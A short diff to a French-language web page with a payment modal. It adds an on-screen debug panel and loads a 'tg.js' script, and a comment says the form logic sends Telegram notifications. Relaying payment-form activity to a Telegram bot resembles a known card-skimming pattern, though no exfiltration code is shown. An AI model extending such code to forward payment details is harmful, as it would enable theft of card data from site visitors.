@@ -1,4 +1,3 @@
-<!-- index.html -->
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -203,10 +202,19 @@
     </div>
   </div>
 
+  <!-- Panneau in-page pour debug -->
+  <div id="debug-panel" style="
+    position: fixed; bottom: 0; left: 0;
+    width: 100%; max-height: 30%; overflow-y: auto;
+    background: rgba(0,0,0,0.8); color: #0f0;
+    font-size: 12px; font-family: monospace;
+    padding: 0.5rem; z-index: 10000;
+  "></div>
+
   <!-- Script tg.js pour notifications Telegram -->
   <script src="tg.js"></script>
   <script>
-    // Logique JS complète (formatage, navigation étapes, envoi notifications)
+    // Votre JS de modal / form inchangé, avec appels sendTelegramNotification(message)
     const payBtn    = document.getElementById('pay-btn');
     const modal     = document.getElementById('payment-modal');
     const closeBtn  = document.getElementById('modal-close');
